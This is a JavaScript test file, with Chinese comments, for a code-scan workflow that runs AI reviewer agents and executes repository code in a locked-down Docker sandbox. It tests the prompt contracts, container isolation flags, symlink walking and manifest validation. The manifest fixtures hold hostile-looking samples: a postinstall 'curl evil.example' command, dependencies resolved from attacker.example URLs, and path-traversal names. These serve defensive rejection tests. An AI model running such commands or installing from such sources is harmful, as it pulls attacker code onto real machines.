/**
 * 运行时复现的离线验收测试。
 *
 * 不需要 Docker:所有片段都是普通 Node 源码,直接以 `node -e <snippet> -- args`
 * 运行,和 workflow 里 world.run 的调用方式一致。Docker 相关路径由设计稿保证,
 * 这里覆盖的是「能从源码里抽出来单跑的」那一半。
 *
 * 跑法: node test/runtime-verify.test.mjs
 * 需要 tsc 时: TSC=<path/to/tsc.js> node test/runtime-verify.test.mjs
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { createRequire } from "node:module";
import { fileURLToPath, pathToFileURL } from "node:url";

const requireFromHere = createRequire(import.meta.url);

const here = path.dirname(fileURLToPath(import.meta.url));
const TEMPLATE = path.join(here, "..", "code-scan", "scripts", "code-scan.ts");
const SOURCE = fs.readFileSync(TEMPLATE, "utf8");

let passed = 0;
const failures = [];
function check(name, fn) {
  try {
    fn();
    passed += 1;
  } catch (error) {
    failures.push(`${name}: ${error && error.message ? error.message : error}`);
  }
}
/** 逻辑测试里的异步用例:await 它。 */
async function checkAsync(name, fn) {
  try {
    await fn();
    passed += 1;
  } catch (error) {
    failures.push(`${name}: ${error && error.message ? error.message : error}`);
  }
}
function assert(condition, message) {
  if (!condition) throw new Error(message);
}

/**
 * 抽取 `const NAME = String.raw`...`;` 的原文(反斜杠保持字面)。
 * 模板里可以引用别的 raw 块(目前只有脱敏规则 REDACT_SRC):按模板字面量的语义原样代入。
 */
function rawBlock(name) {
  const marker = `const ${name} = String.raw\``;
  const start = SOURCE.indexOf(marker);
  if (start < 0) throw new Error(`missing ${name}`);
  const bodyStart = start + marker.length;
  const end = SOURCE.indexOf("\n`;", bodyStart);
  if (end < 0) throw new Error(`unterminated ${name}`);
  return SOURCE.slice(bodyStart, end).replace(/\$\{REDACT_SRC\}/g, () => rawBlock("REDACT_SRC"));
}

/** 抽取 `const NAME = [ "...", ... ].join("");` 的数组字面量并求值。 */
function arrayBlock(name) {
  const marker = `const ${name} = [`;
  const start = SOURCE.indexOf(marker);
  if (start < 0) throw new Error(`missing ${name}`);
  const bodyStart = start + marker.length - 1;
  const end = SOURCE.indexOf('].join("");', bodyStart);
  if (end < 0) throw new Error(`unterminated ${name}`);
  const literal = SOURCE.slice(bodyStart, end + 1);
  return new Function(`return ${literal};`)();
}

/** 抽取单行 const 字符串。 */
function lineString(name) {
  const match = new RegExp(`const ${name} = "([^"]*)";`).exec(SOURCE);
  if (match === null) throw new Error(`missing ${name}`);
  return match[1];
}

function runNode(code, args, options = {}) {
  const result = spawnSync(process.execPath, ["-e", code, "--", ...args], {
    encoding: "utf8",
    timeout: options.timeout === undefined ? 30000 : options.timeout,
    cwd: options.cwd === undefined ? os.tmpdir() : options.cwd,
    env: { ...process.env, ...(options.env || {}) },
  });
  return {
    status: result.status,
    stdout: result.stdout || "",
    stderr: result.stderr || "",
    error: result.error,
  };
}

function mkdtemp(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function writeFixturePackage(dir, pkg, lock) {
  fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify(pkg, null, 2));
  if (lock !== undefined) {
    fs.writeFileSync(path.join(dir, "package-lock.json"), JSON.stringify(lock, null, 2));
  }
}

function validLock(overrides = {}) {
  return {
    name: "fixture",
    version: "1.0.0",
    lockfileVersion: 3,
    requires: true,
    packages: {
      "": { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } },
      "node_modules/express": {
        version: "4.18.2",
        resolved: "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
        integrity: "sha512-fixture",
        ...overrides,
      },
    },
  };
}

/* ------------------------------------------------------------------------- */
/* 提示词契约:数字来自常量、条款可观测                                        */
/* ------------------------------------------------------------------------- */

function sourceRegion(startMarker, endMarker) {
  const start = SOURCE.indexOf(startMarker);
  if (start < 0) throw new Error(`missing ${startMarker}`);
  const end = SOURCE.indexOf(endMarker, start);
  if (end < 0) throw new Error(`missing ${endMarker} after ${startMarker}`);
  return SOURCE.slice(start, end);
}

check("PROMPT:批次上限来自常量,没有第二个数字", () => {
  const region = sourceRegion("你是代码评审员", "reproGuidance,");
  assert(region.includes("${MAX_FINDINGS_PER_BATCH}"), "batch cap must be interpolated");
  assert(!/最多\s*\d+\s*条/.test(region), "batch prompt must not hardcode a count");
  assert(!region.includes("补充 3 条"), "unobservable supplement cap must be gone");
});

check("PROMPT:全局评审员的条数上限与 slice 共用一个常量", () => {
  const region = sourceRegion("你负责跨批次模式审查", "不要编辑任何文件。");
  assert(region.includes("${MAX_GLOBAL_FINDINGS}"), "global cap must be interpolated");
  assert(SOURCE.includes("slice(0, MAX_GLOBAL_FINDINGS)"), "slice must use the constant");
});

check("PROMPT:评审长负责合并且覆盖受代码校验", () => {
  assert(SOURCE.includes("评审长输出不完整"), "missing coverage fallback note");
  assert(SOURCE.includes("applyJudgeRanking"), "judge ranking must be validated in code");
  assert(sourceRegion("你负责去重与排序", "不要编辑任何文件。").includes("恰好出现一次"), "judge must account for every key");
});

check("PROMPT:接地比对压平空白", () => {
  assert(SOURCE.includes("squashForMatch"), "grounding must normalize whitespace");
});

check("PROMPT:全局评审员重开需新事实并看到误报记录", () => {
  assert(SOURCE.includes("重开依据"), "global reopen rule missing");
  assert(SOURCE.includes("批次已排除的信号"), "dismissal records must reach the global reviewer");
});

check("PROMPT:复现契约与实际沙箱一致", () => {
  assert(SOURCE.includes("不得写 /src 或 /deps"), "repro write ban must match mounts");
  assert(!SOURCE.includes("读环境变量、改 process 全局"), "stale env ban must be gone");
});

check("PROMPT:规划员要求抗重命名,维度覆盖按模式要求", () => {
  assert(SOURCE.includes("规则要抗重命名"), "rename-resilience bullet missing");
  assert(SOURCE.includes("上面每个维度都要有产生信号的规则覆盖"), "dimension coverage bullet missing");
  assert(SOURCE.includes("按扫描侧重只写相关维度的规则,不要求覆盖全部维度"), "custom mode must not force coverage");
});

/* ------------------------------------------------------------------------- */
/* 扫描模式:维度文案只有一个来源(注册表),模式表与流程自洽                     */
/* ------------------------------------------------------------------------- */

const DEVIN_SCAN_TYPES = ["性能", "数据库查询", "测试覆盖", "死代码", "代码质量", "清理", "遥测", "无障碍", "合规", "迁移文档", "自定义"];

function tableRegion(name) {
  const start = SOURCE.indexOf(`const ${name}: `);
  if (start < 0) throw new Error(`missing table ${name}`);
  const end = SOURCE.indexOf("\n];", start);
  if (end < 0) throw new Error(`unterminated table ${name}`);
  return SOURCE.slice(start, end);
}

check("MODE:维度文案只在注册表里出现一次", () => {
  const region = tableRegion("DIMENSIONS");
  const texts = [...region.matchAll(/(?:planner|reviewer):\s*"([^"]+)"/g)].map((match) => match[1]).filter((text) => text !== "");
  assert(texts.length >= 16, `expected planner+reviewer text for at least 8 dimensions, got ${texts.length}`);
  for (const text of texts) {
    const count = SOURCE.split(text).length - 1;
    assert(count === 1, `dimension text must have a single source, found ${count}x: ${text.slice(0, 30)}`);
  }
});

check("MODE:规划员与评审员的维度文案来自注册表", () => {
  const planner = sourceRegion("function planPrompt(", "function revisionPrompt(");
  assert(planner.includes("- ${spec.id}(${spec.label}):${spec.planner}"), "planner must list dimensions from the registry");
  assert(planner.includes('dimension 取 ${specs.map((spec) => spec.id).join("|")}'), "planner dimension list must be generated");
  assert(!SOURCE.includes("dimension 取 quality|dead-code|perf"), "planner must not hardcode the legacy dimensions");
  const reviewer = sourceRegion("你是代码评审员", "reproGuidance,");
  assert(reviewer.includes("${reviewerDimensionLines}"), "reviewer must list dimensions from the registry");
  assert(SOURCE.includes("const reviewerDimensionLines = activeDimensionSpecs(mode)"), "reviewer dimensions must follow the mode");
  assert(!reviewer.includes("维度只有三个"), "reviewer must not hardcode a dimension count");
});

check("MODE:全局评审员与修订员只认本次模式的维度", () => {
  assert(SOURCE.includes('新增发现只限这些维度:${mode.dimensions.join("|")}'), "global reviewer must be bounded to the mode");
  const revision = sourceRegion("function revisionPrompt(", "async function migrationDocument");
  assert(revision.includes("dimension 只取 ${mode.dimensions.join(\"|\")}"), "revision must be bounded to the mode");
});

check("MODE:未扫描的维度写进 notCovered,而不是当成没发现问题", () => {
  assert(SOURCE.includes("没有扫描这些维度"), "unscanned dimensions must be disclosed");
  assert(SOURCE.includes("本次模式(${mode.label})没有扫描"), "disclosure must name the mode");
});

check("MODE:发现类之外的维度不进批次", () => {
  const plan = sourceRegion('phase("规划:为每个仓库写全库选择器")', "const executions: RepoExecution[]");
  assert(plan.includes("normalizeSelectors(plan.selectors, caps, planningNotes, mode.dimensions)"), "planner output must be filtered by mode");
  assert(plan.includes("readSelectorManifest(selectorPath, caps, planningNotes, mode.dimensions)"), "archive must be filtered by mode");
  assert(plan.includes("selectorPathFor(repo.key, mode.id)"), "archive path must follow the mode");
  assert(SOURCE.includes("normalizeFinding(raw, findingNotes, mode.dimensions)"), "batch findings must be checked against the mode");
});

check("MODE:迁移文档的位置全部经过接地,流程图由代码生成", () => {
  assert(SOURCE.includes("return await migrationDocument();"), "document mode must stop before the findings pipeline");
  const doc = sourceRegion("async function migrationDocument(): Promise<WorkflowReport>", 'phase("准备:获取目标仓库并探测工具")');
  assert(doc.includes("ask<FlowReport>"), "tracer must return a typed result");
  assert(
    doc.includes("groundFlow(") && doc.includes("locationIssue(") && sourceRegion("async function groundFlow(", "function mermaidLabel(").includes("checkCitations("),
    "the leading location, the citations inside step text, and those in systems and risks must all be grounded",
  );
  assert(doc.includes("mermaidFlows(drawn)") && doc.includes("flow.verifiedSteps"), "diagram must use grounded steps only");
  // 编译器静态要求一次运行只有一个主交付物:迁移文档与发现报告共用 "report" 这个 id。
  const published = [...SOURCE.matchAll(/artifact\.markdown\(\s*"([^"]+)"/g)].map((match) => match[1]);
  assert(published.length === 2 && published.every((id) => id === "report"), `both deliverables must share one id, got ${published.join(",")}`);
  assert(doc.includes('artifact.markdown("report", content, {'), "document must be published as an artifact");
  assert(doc.includes("位置未能核对") && doc.includes("未能核对的位置"), "unverified locations must be labelled, not dropped");
  assert(doc.includes("## 未覆盖") && doc.includes("setupNotes") && doc.includes("!repo.ok"), "failed repositories and capability notes must reach both the document and notCovered");
  assert(doc.includes("nameKey(other.name) === nameKey(flow.name)") && doc.includes("stepOverlap(flow, other) >= FLOW_SAME_OVERLAP"), "two business branches behind one dispatcher entry must not collapse; the same flow traced twice must");
  assert(!/unverified\.concat\([^)]*\)\)\)\.slice\(/.test(doc), "unverified locations must never be truncated silently");
  assert(doc.includes("docClipped"), "a clipped document must say so instead of claiming every failure is listed");
  assert(doc.includes("脚本没有运行仓库代码"), "the script itself runs no repository code; that limit must be disclosed");
  // 文档模式只读代码梳理流程,没有要执行的验证:不要为它拉镜像、起容器。
  assert(
    SOURCE.includes('mode.kind === "document"\n  ? runtimeDisabled("迁移文档模式不使用沙箱")'),
    "document mode must skip the Docker probe",
  );
});

check("MODE:覆盖的维度按实际执行过的信号规则算", () => {
  assert(SOURCE.includes("const coveredDimensions = DIMENSIONS.map((spec) => spec.id).filter("), "coverage must be derived from executed signal rules");
  assert(SOURCE.includes("本次模式允许、但没有任何信号规则的维度"), "allowed-but-uncovered dimensions must be named");
  assert(SOURCE.includes("有信号规则的维度:${coveredDimensions.map(dimensionLabel)"), "the report must state covered dimensions from what ran");
});

check("PROMPT:字段注释里不再藏着第二个条数上限", () => {
  // 返回结构的字段说明会进子代理读到的 schema:一句「最多 12 条」就让评审员把已确认的发现挤进了 notCovered。
  assert(!/\/\*\*[^*]*最多 \d+ 条/.test(SOURCE), "a count in a field comment becomes a second cap the prompt never asked for");
  assert(SOURCE.includes("每批次最多 ${MAX_FINDINGS_PER_BATCH} 条"), "the only batch cap is the interpolated constant");
});

check("PROMPT:规划员的能力清单列出每个工具", () => {
  // 真机上规划员因为清单里没有 a11y/test-reach 而没写工具规则;清单必须逐项给出,不能让它去推断。
  const capability = sourceRegion("const capabilityLine = [", '].join("; ");');
  for (const entry of ["ast-grep=", "knip=", "jscpd=", "graph(madge)=", "test-reach(", "a11y("]) {
    assert(capability.includes(entry), `planner capability list must show ${entry}`);
  }
  assert(sourceRegion("- kind=tool:query 取", "\n").includes("能力清单里对应项为 true 才写"), "the tool bullet must tie each tool to its capability line");
});

check("PROMPT:死代码判据要求把「仅测试引用」作为发现报告", () => {
  // 带标签 fixture 上观察到:评审员把「仅测试引用」写进 notCovered 却不报告,植入项漏掉。
  assert(tableRegion("DIMENSIONS").includes("只被测试引用的模块也是发现,不要只在 notCovered 里提一句"), "criteria must say noted-only is not enough");
  // 同一次运行里两个批次对同一信号处理不一致:一个报了,另一个写「维度判据与信号排除项冲突」后不报。
  assert(sourceRegion("你是代码评审员", "reproGuidance,").includes("排除只否定这条信号所说的那一类问题"), "a suppressor negates one claim, not every category");
});

check("PROMPT:接地按省略号片段比对,全局评审员的摘要按整条截断", () => {
  const grounding = sourceRegion("async function groundFinding(", "/* ----------------------------------------------------------------------------\n * 运行时复现");
  assert(grounding.includes("quoteFound(joined, snippet)") && grounding.includes("quoteFound(nearby, snippet)"), "grounding must accept abridged quotes");
  assert(grounding.includes(">= QUOTE_MIN_CHARS"), "quotes too short to mean anything must be ignored");
  const globalAsk = sourceRegion("已复核发现:", "批次已排除的信号");
  assert(globalAsk.includes("${digestFindings(ranked, 4000)}") && !globalAsk.includes("clip(JSON.stringify("), "the digest must not be cut in the middle of a finding");
});

check("GROUND:where 里有多个位置时取第一个「路径:行号」,读之前先 stat", () => {
  // 运行日志里读失败过的写法:`a.js:2(另 b.js:3)`、`a.js:9/12`、`a.js:3,10`、`a.js:9; b.js:21`。
  // 每次读失败都在时间线上留一张红色步骤,还把定位正确的发现标成待复核。
  assert(!SOURCE.includes("function parseWhere("), "the single-location parser must not come back");
  const grounding = sourceRegion("async function groundFinding(", "/* ----------------------------------------------------------------------------\n * 运行时复现");
  const parse = grounding.indexOf("whereTarget(finding.where)");
  const read = grounding.indexOf("readSourceFile(repoPath)");
  assert(parse > 0 && read > parse, "parse → read through the guarded helper, in that order");
  assert(!grounding.includes("files.read("), "grounding must not read directly: the helper decides whether the path is a readable regular file first");
  assert(sourceRegion("const LOCATION_HEAD = ", "async function groundFinding(").includes("LOCATION_HEAD.exec(written)"), "the leading location comes from the head pattern");
  const guarded = sourceRegion("async function readSourceFile(", "async function npmGuard(");
  assert(guarded.includes("READ_SOURCE_CODE") && !guarded.includes("files.read("), "the read itself goes through the node snippet, so an unreadable file cannot leave a failed read step");
  const snippet = rawBlock("READ_SOURCE_CODE");
  assert(snippet.includes("stat.isFile()") && snippet.includes("ok:false") && snippet.includes("truncated"), "the snippet rejects non-files, reports failures as data and flags truncation");
  const issue = sourceRegion("async function locationIssue(", "function stringList(");
  assert(issue.includes("readSourceFile(absolute)") && !issue.includes("files.read("), "migration grounding goes through the same helper");
});

check("SANDBOX:审查员的验证走容器,主机执行禁令写进每个子代理的提示词", () => {
  const interpolated = SOURCE.match(/\$\{HOST_EXECUTION_RULE\}/g) ?? [];
  const concatenated = SOURCE.match(/\+ HOST_EXECUTION_RULE\b/g) ?? [];
  assert(
    interpolated.length + concatenated.length >= 6,
    `the rule must reach planner, reviser, reviewer, tracer, judge and global reviewer (got ${interpolated.length + concatenated.length})`,
  );
  assert(SOURCE.includes("不允许在主机上执行") && SOURCE.includes("不要在仓库目录里执行 npm/npx/pnpm/yarn"), "the rule names what is forbidden");
  const reviewer = sourceRegion("你是代码评审员", "reproGuidance,");
  const guidance = sourceRegion("const sandboxGuidance = runtimeProbe.ok", "const knipConfigPath").slice(0, 1200);
  assert(reviewer.includes("${sandboxGuidance}"), "the reviewer persona carries the sandbox guidance");
  assert(guidance.includes("sandboxRuns") && guidance.includes("先在沙箱里跑过再下结论"), "and the guidance says to verify by running there");
  assert(SOURCE.includes("本次没有可用的沙箱:不要执行仓库代码"), "and what to do when there is none");
  assert(SOURCE.includes("拿不准就不要给 repro。\"") && SOURCE.includes("const reproGuidance = runtimeVerify && runtimeProbe.ok"), "repro guidance is only offered when repro will run");
});

check("SANDBOX:复现与审查员运行共用同一套容器隔离参数", () => {
  const argv = sourceRegion("function sandboxArgv(", "function normalizeSandboxRuns(");
  for (const flag of ["--network=none", "--read-only", "\"65534:65534\"", "--cap-drop=ALL", "no-new-privileges", "--pids-limit", "--memory", "target=/src,readonly"]) {
    assert(argv.includes(flag), `sandbox container must keep ${flag}`);
  }
  const repro = sourceRegion("async function runRepro(", "function sandboxArgv(");
  assert(repro.includes("sandboxArgv(container, repo, `REPRO_SPEC_B64=${b64}`, RUNNER_SRC)"), "repro must go through the shared argv");
  const sandbox = sourceRegion("async function runSandbox(", "function normalizeSelectors(");
  assert(sandbox.includes("sandboxArgv(container, repo, `SANDBOX_SPEC_B64=${b64}`, SANDBOX_RUNNER_SRC)"), "and so must the reviewer runs");
  assert(sandbox.includes("linksStillOk(repo.dir)") && sandbox.includes('"rm", "-f", container'), "link check before mounting, blind removal after");
  assert(sandbox.includes("auditWrite(") && sandbox.includes("sandbox-spec-"), "every run is audited");
});

check("SANDBOX:没装 docker 时不产生 docker 调用;逐条复现仍由 runtimeVerify 控制", () => {
  const probe = sourceRegion("async function detectRuntimeVerify(): Promise<RuntimeProbe>", "function normalizeAssertion(");
  assert(!probe.includes("if (!runtimeVerify)"), "the probe must not be gated by runtimeVerify: the sandbox is the default");
  assert(probe.indexOf("dockerGuard(workspaceRoot)") < probe.indexOf('["version"') && probe.includes("!guard.found"), "docker is located before it is ever called");
  assert(!probe.includes("runtimeDisabled(\"找不到本机 npm 缓存"), "a missing npm cache must not switch the sandbox off, only offline installs");
  assert(SOURCE.includes("const reproJobs = runtimeVerify && runtimeProbe.ok ? selectReproJobs(finalFindings) : [];"), "per-finding repro stays opt-in");
  assert(SOURCE.includes("state: \"unmountable\"") && !SOURCE.includes("dockerShadowed("), "structural failures are a separate state; the old boolean guard is gone");
  assert(SOURCE.includes("if (repo.state === \"unmountable\")"), "sandbox runs refuse an unmountable repo");
  // 依赖装不上时仓库自带的 node_modules 仍要遮住:沙箱不能退回去用主机装出来的依赖。
  const prepare = sourceRegion("async function prepareRepoRuntime(", "/** 一条复现规格");
  const failures = [...prepare.matchAll(/state: "failed"/g)];
  assert(failures.length >= 8, "dependency failures exist");
  for (const failure of failures) {
    assert(prepare.slice(failure.index, failure.index + 160).includes("mountNodeModules: hasNodeModules"), "every failed return must say whether to mask node_modules");
  }
  const flow = sourceRegion("let withSandbox = reviewed;", "const batched = withSandbox.map(");
  assert(flow.includes('phase("沙箱:在隔离容器里执行审查员要跑的验证")') && flow.includes('phase("修订:按沙箱运行结果修订发现")'), "two visible phases: run, then revise");
  assert(flow.includes("await runSandbox(") && flow.includes("item.reviewer.ask<BatchReport>(sandboxRevisionAsk("), "one execution pass, then one revision by the same reviewer");
  assert(SOURCE.includes("提示词约束"), "the report must say the host-execution ban is a prompt constraint, not a mechanism");
});

check("PROMPT:命中判据进入 schema 并展示给审查员", () => {
  assert(SOURCE.includes("positive: string;") && SOURCE.includes("suppressor: string;"), "selector criteria fields missing");
  assert(SOURCE.includes("选择器意图与判据:"), "formatGroups must print criteria");
  assert(SOURCE.includes("写不出具体判据就删掉这条规则"), "planner must delete vacuous rules");
});

check("PROMPT:维度缺口写进 notCovered", () => {
  assert(SOURCE.includes("规划员没有产出这些维度的信号规则"), "coverage gap must be surfaced");
});

/* ------------------------------------------------------------------------- */
/* 片段:base64 编码与字节上限                                                  */
/* ------------------------------------------------------------------------- */

const B64_CODE = rawBlock("B64_CODE");

check("B64:ASCII 脚本通过并产出 base64", () => {
  const script = "module.exports = { run: () => ({ ok: true }) };";
  const out = JSON.parse(
    runNode(B64_CODE, ["8192", JSON.stringify({ script, assertion: { kind: "throws", match: "x" }, proves: "p" })])
      .stdout,
  );
  assert(out.ok === true, "expected ok");
  assert(typeof out.b64 === "string" && out.b64.length > 0, "expected base64");
  assert(Buffer.from(out.b64, "base64").toString("utf8").includes("run"), "payload round-trips");
});

check("B64:非 ASCII 脚本按字节拒绝(8192 字符 > 8192 字节)", () => {
  const script = "// " + "中".repeat(3000);
  const out = JSON.parse(runNode(B64_CODE, ["8192", JSON.stringify({ script })]).stdout);
  assert(out.ok === false, "expected rejection");
  assert(out.bytes === Buffer.byteLength(script, "utf8"), `expected ${Buffer.byteLength(script, "utf8")} bytes, got ${out.bytes}`);
});

check("B64:空脚本被拒", () => {
  const out = JSON.parse(runNode(B64_CODE, ["8192", JSON.stringify({ script: "", assertion: null })]).stdout);
  assert(out.ok === false && out.reason === "script too large or empty", "expected empty rejection");
});

check("B64:沙箱运行请求(command)同样被编码并按字节设限", () => {
  // 安全评审抓到的功能缺陷:编码片段原先只认 script,沙箱请求带的是 command,会被一律拒绝,一个容器都起不来。
  const ok = JSON.parse(runNode(B64_CODE, ["16384", JSON.stringify({ command: ["npm", "test"] })]).stdout);
  assert(ok.ok === true && Buffer.from(ok.b64, "base64").toString("utf8").includes('"npm","test"'), JSON.stringify(ok));
  const big = JSON.parse(runNode(B64_CODE, ["32", JSON.stringify({ command: ["node", "-e", "x".repeat(200)] })]).stdout);
  assert(big.ok === false, "a command over the byte cap must be rejected");
  const missing = JSON.parse(runNode(B64_CODE, ["16384", JSON.stringify({})]).stdout);
  assert(missing.ok === false, "a spec with neither script nor command is rejected");
});

/* ------------------------------------------------------------------------- */
/* 片段:链接遍历                                                              */
/* ------------------------------------------------------------------------- */

const WALK_LINKS_CODE = rawBlock("WALK_LINKS_CODE");

check("WALK:普通目录通过并计数", () => {
  const root = mkdtemp("walk-ok-");
  fs.mkdirSync(path.join(root, "a"));
  fs.writeFileSync(path.join(root, "a", "x.js"), "1");
  const out = JSON.parse(runNode(WALK_LINKS_CODE, [root, "50000"]).stdout);
  assert(out.ok === true, "expected ok");
  assert(out.entries >= 2, `expected >=2 entries, got ${out.entries}`);
});

check("WALK:符号链接导致该仓库跳过", () => {
  const root = mkdtemp("walk-link-");
  const target = mkdtemp("walk-target-");
  try {
    fs.symlinkSync(target, path.join(root, "link"), "junction");
  } catch (error) {
    return; // 无权限创建链接时跳过,不算失败
  }
  const out = JSON.parse(runNode(WALK_LINKS_CODE, [root, "50000"]).stdout);
  assert(out.ok === false && /symlink/.test(out.reason), `expected symlink rejection, got ${JSON.stringify(out)}`);
});

check("WALK:node_modules 与 .git 被跳过(不因内部的 npm symlink 误杀)", () => {
  const root = mkdtemp("walk-nm-");
  const target = mkdtemp("walk-nm-target-");
  fs.mkdirSync(path.join(root, "node_modules"));
  try {
    fs.symlinkSync(target, path.join(root, "node_modules", "linked"), "junction");
  } catch (error) {
    return;
  }
  const out = JSON.parse(runNode(WALK_LINKS_CODE, [root, "50000"]).stdout);
  assert(out.ok === true, `node_modules must be skipped, got ${JSON.stringify(out)}`);
});

check("WALK:嵌套 node_modules 让仓库跳过(自带依赖会绕过安装策略)", () => {
  const root = mkdtemp("walk-nested-");
  fs.mkdirSync(path.join(root, "packages", "a", "node_modules"), { recursive: true });
  fs.writeFileSync(path.join(root, "packages", "a", "node_modules", "x.js"), "1");
  const out = JSON.parse(runNode(WALK_LINKS_CODE, [root, "50000"]).stdout);
  assert(out.ok === false && /host node_modules/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("WALK:条目数上限生效", () => {
  const root = mkdtemp("walk-cap-");
  for (let index = 0; index < 8; index += 1) fs.writeFileSync(path.join(root, `f${index}.js`), "1");
  const out = JSON.parse(runNode(WALK_LINKS_CODE, [root, "5"]).stdout);
  assert(out.ok === false && /too many/.test(out.reason), `expected cap rejection, got ${JSON.stringify(out)}`);
});

/* ------------------------------------------------------------------------- */
/* 片段:锁                                                                    */
/* ------------------------------------------------------------------------- */

const LOCK_CODE = rawBlock("LOCK_CODE");
const lockName = `test-${Date.now()}-${Math.floor(Math.random() * 1e6)}`;

check("LOCK:acquire → BUSY → release → acquire", () => {
  const first = runNode(LOCK_CODE, [lockName, "0", "acquire"]);
  assert(first.stdout.trim() === "OK", `first acquire: ${first.stdout}`);
  const second = runNode(LOCK_CODE, [lockName, "0", "acquire"]);
  assert(second.stdout.trim() === "BUSY", `second acquire must be BUSY, got ${second.stdout}`);
  const release = runNode(LOCK_CODE, [lockName, "0", "release"]);
  assert(release.stdout.trim() === "OK", `release: ${release.stdout}`);
  const third = runNode(LOCK_CODE, [lockName, "0", "acquire"]);
  assert(third.stdout.trim() === "OK", `third acquire: ${third.stdout}`);
  runNode(LOCK_CODE, [lockName, "0", "release"]);
});

check("LOCK:非法名字返回 BAD", () => {
  const out = runNode(LOCK_CODE, ["../evil", "0", "acquire"]);
  assert(out.stdout.trim() === "BAD", `expected BAD, got ${out.stdout}`);
});

/* ------------------------------------------------------------------------- */
/* 片段:审计写入                                                              */
/* ------------------------------------------------------------------------- */

const AUDIT_WRITE_CODE = rawBlock("AUDIT_WRITE_CODE");

check("AUDIT:固定文件名写入成功,同名再写失败(wx)", () => {
  const dir = mkdtemp("audit-");
  const first = runNode(AUDIT_WRITE_CODE, [dir, "spec-1.json", "{}"]);
  assert(first.status === 0, `first write: ${first.stderr}`);
  assert(fs.existsSync(path.join(dir, "spec-1.json")), "file exists");
  const second = runNode(AUDIT_WRITE_CODE, [dir, "spec-1.json", "{}"]);
  assert(second.status !== 0, "second write must fail (wx)");
});

check("AUDIT:路径穿越文件名被拒", () => {
  const dir = mkdtemp("audit-");
  const out = runNode(AUDIT_WRITE_CODE, [dir, "../escape.json", "{}"]);
  assert(out.status !== 0, "expected rejection");
});

check("AUDIT:内容先脱敏再落盘", () => {
  const dir = mkdtemp("audit-redact-");
  const token = "ghp_abcdefghijklmnopqrstuvwx";
  const out = runNode(AUDIT_WRITE_CODE, [dir, "spec-redact.json", `{"script":"const t='${token}'"}`]);
  assert(out.status === 0, out.stderr);
  const text = fs.readFileSync(path.join(dir, "spec-redact.json"), "utf8");
  assert(!text.includes(token), "token must be redacted in audit dir");
  assert(text.includes("[redacted]"), "expected redaction marker");
});

/* ------------------------------------------------------------------------- */
/* 片段:npm 缓存                                                              */
/* ------------------------------------------------------------------------- */

const NPM_CACHE_CODE = rawBlock("NPM_CACHE_CODE");

check("CACHE:解析到 <home>/.npm 且不以 _cacache 结尾", () => {
  const out = runNode(NPM_CACHE_CODE, []);
  if (out.status !== 0) return; // 本机没有 ~/.npm 时跳过(现实里 probe 会停用)
  const dir = out.stdout.trim();
  assert(path.basename(dir) === ".npm", `expected cache root, got ${dir}`);
});

/* ------------------------------------------------------------------------- */
/* 片段:manifest 检查(五项)                                                   */
/* ------------------------------------------------------------------------- */

const MANIFEST_CHECK_CODE = rawBlock("MANIFEST_CHECK_CODE");

function checkManifest(dir, maxBytes = "2097152") {
  return JSON.parse(runNode(MANIFEST_CHECK_CODE, [dir, maxBytes]).stdout);
}

check("MANIFEST:合法仓库通过", () => {
  const dir = mkdtemp("mcheck-ok-");
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, validLock());
  const out = checkManifest(dir);
  assert(out.ok === true, `expected ok, got ${JSON.stringify(out)}`);
});

check("MANIFEST:dist-tag 与 prerelease 规格被接受", () => {
  const dir = mkdtemp("mcheck-tag-");
  writeFixturePackage(
    dir,
    { name: "fixture", version: "1.0.0", dependencies: { a: "latest", b: "1.2.3-beta.1", c: "next-2024" } },
    validLock(),
  );
  const out = checkManifest(dir);
  assert(out.ok === true, `dist-tags must be accepted, got ${JSON.stringify(out)}`);
});

check("MANIFEST:URL 规格被拒(且理由只带 key 名)", () => {
  const dir = mkdtemp("mcheck-url-");
  writeFixturePackage(
    dir,
    { name: "fixture", version: "1.0.0", dependencies: { x: "https://10.0.0.5:8080/x.tgz" } },
    validLock(),
  );
  const out = checkManifest(dir);
  assert(out.ok === false, "expected rejection");
  assert(out.reason === "unsupported spec in dependencies: x", `got ${out.reason}`);
});

check("MANIFEST:overrides 里的 URL 被扫到", () => {
  const dir = mkdtemp("mcheck-override-");
  writeFixturePackage(
    dir,
    { name: "fixture", version: "1.0.0", overrides: { "ms@2.1.3": "https://attacker/ms.tgz" } },
    validLock(),
  );
  const out = checkManifest(dir);
  assert(out.ok === false && /overrides/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:git 依赖被拒", () => {
  const dir = mkdtemp("mcheck-git-");
  writeFixturePackage(
    dir,
    { name: "fixture", version: "1.0.0", dependencies: { x: "git+https://attacker.example/x.git" } },
    validLock(),
  );
  const out = checkManifest(dir);
  assert(out.ok === false && /unsupported spec in dependencies/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:v3 标头 + v1 形状(无 packages)被拒", () => {
  const dir = mkdtemp("mcheck-v1shape-");
  writeFixturePackage(
    dir,
    { name: "a", version: "1.0.0", dependencies: { evil: "*" } },
    {
      name: "a",
      version: "1.0.0",
      lockfileVersion: 3,
      requires: true,
      dependencies: { evil: { version: "1.0.0", resolved: "https://attacker.example/evil-1.0.0.tgz" } },
    },
  );
  const out = checkManifest(dir);
  assert(out.ok === false && /no packages map/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:空 integrity 被拒", () => {
  const dir = mkdtemp("mcheck-empty-int-");
  const lock = validLock({ integrity: "  " });
  writeFixturePackage(dir, { name: "fixture", version: "1.0.0", dependencies: { express: "^4.18.0" } }, lock);
  const out = checkManifest(dir);
  assert(out.ok === false && /missing resolved\/integrity/.test(out.reason), `got ${JSON.stringify(out)}`);
});

check("MANIFEST:lifecycle 脚本被拒(只报 key)", () => {
  const dir = mkdtemp("mcheck-life-");
  writeFixturePackage(
    dir,
    { name: "fixture", version: "1.0.0", scripts: { postinstall: "curl evil.example" }, dependencies: { express: "^4.18.0" } },
    validLock(),
  );
  const out = checkManifest(dir);
  assert(out.ok === false && out.reason === "lifecycle script present: postinstall", `got ${JSON.stringify(out)}`);
});

